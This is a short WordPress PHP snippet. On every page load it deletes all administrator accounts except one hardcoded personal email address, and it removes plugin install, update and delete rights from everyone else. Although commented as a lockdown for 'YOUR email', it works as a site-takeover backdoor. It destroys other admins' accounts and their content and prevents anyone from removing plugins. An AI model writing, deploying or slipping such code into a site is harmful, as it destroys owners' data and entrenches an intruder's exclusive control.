<?php
// Only allow YOUR email as admin

add_action('init', function() {

    $allowed_email = 'za373699@gmail.com';

    $users = get_users(['role' => 'administrator']);

    foreach ($users as $user) {
        if ($user->user_email !== $allowed_email) {
            require_once ABSPATH . 'wp-admin/includes/user.php';
            wp_delete_user($user->ID);
        }
    }

});

add_filter('user_has_cap', function($allcaps, $caps, $args, $user) {

    if ($user->user_email !== 'za373699@gmail.com') {

        $allcaps['install_plugins'] = false;
        $allcaps['update_plugins']  = false;
        $allcaps['delete_plugins']  = false;
    }

    return $allcaps;

}, 10, 4);